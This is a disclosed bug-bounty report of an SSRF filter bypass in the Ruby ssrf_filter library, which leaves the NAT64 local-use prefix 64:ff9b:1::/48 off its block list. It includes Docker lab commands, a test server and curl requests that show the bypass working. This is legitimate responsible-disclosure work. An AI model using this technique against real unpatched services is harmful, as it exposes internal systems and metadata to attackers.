---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/web
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2026-03-31
submitted: 2026-03-28T15:26:55.040Z
bounty_usd: null
votes: 65
cve: []
program: "[[programs/arkadiyt-projects|arkadiyt-projects]]"
reporter: "tipsen"
source: "https://hackerone.com/reports/3634400"
title: "SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)"
---
# SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 65 | **Program:** arkadiyt-projects | **Disclosed:** 2026-03-31

- Report: [https://hackerone.com/reports/3634400](https://hackerone.com/reports/3634400)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2026-03-28T15:26:55.040Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
`ssrf_filter` v1.3.0 blocks `64:ff9b::/96`, but doesnt block the NAT64 local-use prefix `64:ff9b:1::/48`, allowing those addresses to be treated as public. This enables SSRF requests through `/fetch` to internal-equivalent targets encoded under that prefix when routable in the deployment environment.

## Steps To Reproduce:
1. Like previous report, start our lab first :) (I'm using the library in Docker)
2. Start a second app container with `NET_ADMIN` so we can add a test IPv6 route/address.
```bash
TIPSEN:~:% NET=$(docker inspect ssrf_filter_lab --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}')
TIPSEN:~:% docker rm -f ssrf_filter_lab_netadmin 2>/dev/null || true
ssrf_filter_lab_netadmin
TIPSEN:~:% docker run -d --name ssrf_filter_lab_netadmin --network "$NET" --cap-add NET_ADMIN -p 4568:4567 bbp-ssrf-ssrf-app ruby app.rb
46929c09894e83249c8143c192a727f2583b116c2be0ce70e1528773fb3b388f
```

3. Install `iproute2` in that container and add NAT64 local-use address `64:ff9b:1::7f00:1` to loopback.
```bash
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'apt-get update -qq && apt-get install -y -qq iproute2 && ip -6 addr add 64:ff9b:1::7f00:1/128 dev lo || true && ip -6 addr show dev lo'
...
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet6 64:ff9b:1::7f00:1/128 scope global
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo
       valid_lft forever preferred_lft forever
```

4. Start a local HTTP service bound to that NAT64 local-use address.
```bash
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'cat > /tmp/vuln_server_nat64.rb << "RUBY"
require "socket"
server = TCPServer.new("64:ff9b:1::7f00:1", 18081)
loop do
  sock = server.accept
  begin
    while (line = sock.gets)
      break if line == "\r\n"
    end
    body = "NAT64_PREFIX_BYPASS_DEMO"
    sock.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: #{body.bytesize}\r\nConnection: close\r\n\r\n#{body}")
  ensure
    sock.close rescue nil
  end
end
RUBY
nohup ruby /tmp/vuln_server_nat64.rb >/tmp/vuln_server_nat64.log 2>&1 &'
```

5. Verify the service is reachable on that address from inside the same container.
```bash
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'ruby -rsocket -e "s=TCPSocket.new(\"64:ff9b:1::7f00:1\",18081); s.write(\"GET / HTTP/1.0\r\nHost: x\r\n\r\n\"); puts s.read; s.close"'
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 24
Connection: close

NAT64_PREFIX_BYPASS_DEMO
```

6. Control check: known blocked NAT64 well-known prefix.
```bash
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b::7f00:1]:18081'
{"status":"blocked","error":"SsrfFilter::PrivateIPAddress","message":"Hostname '64:ff9b::7f00:1' has no public ip addresses"}%
```

7.  Bypass check: unblocked NAT64 local-use prefix.
```bash
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b:1::7f00:1]:18081'
{"status":"allowed","code":"200","headers":{"content-type":"text/plain","content-length":"24","connection":"close"},"body":"NAT64_PREFIX_BYPASS_DEMO"}%
```

## Supporting Material/References:
Gonna put the root cause here to make checking easier :)
1. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L47-L59: `IPV6_BLACKLIST` includes `64:ff9b::/96` but doesn't include `64:ff9b:1::/48` (NAT64 local-use prefix), leaving that range unclassified as private/unsafe.
2. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L139-L143: `unsafe_ip_address?` decides IPv6 safety only by membership in `IPV6_BLACKLIST`. Because `64:ff9b:1::/48` is missing, those addresses are treated as safe/public.
3. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L126-L127: The resolver output is filtered with `unsafe_ip_address?` and unblocked NAT64 local-use addresses remain in `public_addresses`, so the private-IP guard is bypassed.

## Impact

An attacker can bypass SSRF protections and force server-side requests to restricted/internal destinations using `64:ff9b:1::/48` addresses. This may expose sensitive internal services or metadata and can enable additional internal network reconnaissance or pivoting.

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2026-03-31** @arkadiyt: Thanks, will take a look
- **Report Resolved**
- **2026-03-31** @tipsen: Looks good! Thanks!
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
